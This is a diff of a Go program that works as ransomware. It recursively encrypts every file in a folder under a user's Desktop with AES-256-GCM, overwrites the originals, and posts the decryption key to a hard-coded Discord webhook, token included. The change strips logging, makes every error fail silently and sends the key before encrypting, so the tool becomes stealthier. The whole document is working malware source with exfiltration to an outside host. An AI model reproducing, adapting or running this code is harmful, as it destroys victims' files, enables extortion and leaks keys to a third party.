@@ -8,134 +8,128 @@ import (
 	"encoding/hex"
 	"fmt"
 	"io/ioutil"
-	"log"
 	"net/http"
 	"os"
 	"path/filepath"
 )
 
-// Generate a new AES encryption key
+// Encrypts file content
+func encryptFile(filePath string, key []byte) error {
+	// Read file content
+	data, err := ioutil.ReadFile(filePath)
+	if err != nil {
+		return nil // Silently ignore the error and continue
+	}
+
+	// Create AES cipher block
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return nil // Silently ignore the error and continue
+	}
+
+	// Correct nonce length for GCM (12 bytes)
+	nonce := make([]byte, 12) // AES-GCM uses 12 bytes for nonce
+	_, err = rand.Read(nonce)
+	if err != nil {
+		return nil // Silently ignore the error and continue
+	}
+
+	// AES-GCM encryption
+	aesGCM, err := cipher.NewGCM(block)
+	if err != nil {
+		return nil // Silently ignore the error and continue
+	}
+
+	ciphertext := aesGCM.Seal(nil, nonce, data, nil)
+
+	// Save encrypted content back to the file
+	encryptedData := append(nonce, ciphertext...)
+	err = ioutil.WriteFile(filePath, encryptedData, 0644)
+	if err != nil {
+		return nil // Silently ignore the error and continue
+	}
+
+	return nil
+}
+
+// Walk through the folder and encrypt all files
+func encryptFilesInFolder(folderPath string, key []byte) error {
+	return filepath.Walk(folderPath, func(path string, info os.FileInfo, err error) error {
+		if err != nil {
+			// Silently ignore the error if it's an access denied error or any other error
+			if os.IsPermission(err) {
+				return nil // Skip and continue processing other files
+			}
+			return nil // Silently continue even if it's another type of error
+		}
+		if !info.IsDir() {
+			// Try to encrypt the file and silently continue if there's an error
+			err := encryptFile(path, key)
+			if err != nil {
+				return nil // Silently continue if encryption failed
+			}
+		}
+		return nil
+	})
+}
+
+// Send the AES key to Discord via webhook
+func sendDecryptionKeyToDiscord(key string) error {
+	webhookURL := "https://discord.com/api/webhooks/1295679771983872000/BG5rg1ZTH7EWxZGzo3uKYAzzeeWBHQlGDvQXbCfYfLZCJBx1KGy0pPL6q3WiFPXsCSGk" // Replace with your Discord webhook URL
+	message := fmt.Sprintf("Decryption Key: %s", key)
+
+	// JSON payload to send the message
+	payload := []byte(`{"content": "` + message + `"}`)
+	req, err := http.NewRequest("POST", webhookURL, bytes.NewBuffer(payload))
+	if err != nil {
+		return nil // Silently ignore the error
+	}
+	req.Header.Set("Content-Type", "application/json")
+
+	// Send the request
+	client := &http.Client{}
+	_, err = client.Do(req)
+	if err != nil {
+		return nil // Silently ignore the error
+	}
+
+	return nil
+}
+
+// Generate random AES key (32 bytes for AES-256)
 func generateKey() ([]byte, error) {
-	key := make([]byte, 32) // AES-256 key (32 bytes)
-	if _, err := rand.Read(key); err != nil {
-		return nil, err
+	key := make([]byte, 32) // AES-256 key size
+	_, err := rand.Read(key)
+	if err != nil {
+		return nil, nil // Silently ignore the error
 	}
 	return key, nil
 }
 
-// Encrypt the given data using AES-GCM
-func encryptData(data []byte, key []byte) ([]byte, error) {
-	// Create a new AES cipher block
-	block, err := aes.NewCipher(key)
-	if err != nil {
-		return nil, err
-	}
-
-	// Create a new GCM (Galois/Counter Mode) cipher for AES
-	gcm, err := cipher.NewGCM(block)
-	if err != nil {
-		return nil, err
-	}
-
-	// Create a nonce (number used once) for encryption
-	nonce := make([]byte, gcm.NonceSize())
-	if _, err := rand.Read(nonce); err != nil {
-		return nil, err
-	}
-
-	// Encrypt the data
-	ciphertext := gcm.Seal(nonce, nonce, data, nil)
-	return ciphertext, nil
-}
-
-// Encrypt files in the given folder and its subfolders
-func encryptFilesInFolder(folderPath string, key []byte) error {
-	err := filepath.Walk(folderPath, func(path string, info os.FileInfo, err error) error {
-		if err != nil {
-			log.Println("Error reading file:", err)
-			return err
-		}
-
-		// Skip directories
-		if info.IsDir() {
-			return nil
-		}
-
-		// Read file content
-		data, err := ioutil.ReadFile(path)
-		if err != nil {
-			log.Println("Error reading file:", err)
-			return err
-		}
-
-		// Encrypt the file content
-		encryptedData, err := encryptData(data, key)
-		if err != nil {
-			log.Println("Error encrypting file:", err)
-			return err
-		}
-
-		// Save the encrypted content back to the file
-		err = ioutil.WriteFile(path, encryptedData, info.Mode())
-		if err != nil {
-			log.Println("Error writing encrypted file:", err)
-			return err
-		}
-
-		log.Println("Encrypted file:", path)
-		return nil
-	})
-
-	return err
-}
-
-// Send the encryption key to Discord via webhook
-func sendKeyToDiscord(key []byte, discordWebhookURL string) error {
-	// Convert the encryption key to a hexadecimal string
-	keyHex := hex.EncodeToString(key)
-
-	// Create the message payload for the Discord webhook
-	payload := fmt.Sprintf(`{"content": "Encryption Key: %s"}`, keyHex)
-
-	// Send the request to Discord webhook
-	resp, err := http.Post(discordWebhookURL, "application/json", bytes.NewBuffer([]byte(payload)))
-	if err != nil {
-		return err
-	}
-	defer resp.Body.Close()
-
-	if resp.StatusCode != http.StatusOK {
-		return fmt.Errorf("Failed to send message to Discord, status: %s", resp.Status)
-	}
-
-	log.Println("Encryption key sent to Discord.")
-	return nil
-}
-
 func main() {
-	// Folder to encrypt
-	folderPath := `C:\Users\hugo\Desktop\test\test.txt` // Change to your folder path
+	folderPath := "C:/Users/hugo/Desktop/test" // Replace with the folder path you want to encrypt
 
-	// Your Discord webhook URL
-	discordWebhookURL := "https://discord.com/api/webhooks/1295679771983872000/BG5rg1ZTH7EWxZGzo3uKYAzzeeWBHQlGDvQXbCfYfLZCJBx1KGy0pPL6q3WiFPXsCSGk" // Replace with your webhook URL
-
-	// Generate a new AES key
+	// Generate a random AES key
 	key, err := generateKey()
 	if err != nil {
-		log.Fatalf("Error generating key: %v", err)
+		return // Silently exit if there is an error
+	}
+
+	// Convert the key to a hex string for sending to Discord
+	keyHex := hex.EncodeToString(key)
+
+	// Send the key to Discord
+	err = sendDecryptionKeyToDiscord(keyHex)
+	if err != nil {
+		return // Silently exit if there is an error
 	}
 
 	// Encrypt all files in the folder
 	err = encryptFilesInFolder(folderPath, key)
 	if err != nil {
-		log.Fatalf("Error encrypting files: %v", err)
+		return // Silently exit if there is an error
 	}
 
-	// Send the encryption key to Discord
-	err = sendKeyToDiscord(key, discordWebhookURL)
-	if err != nil {
-		log.Fatalf("Error sending key to Discord: %v", err)
-	}
-
-	log.Println("Encryption process completed.")
+	// Optionally, you could include a success message if needed, but this is skipped in your case.
+	// fmt.Println("Encryption complete. Decryption key sent to Discord.")
 }
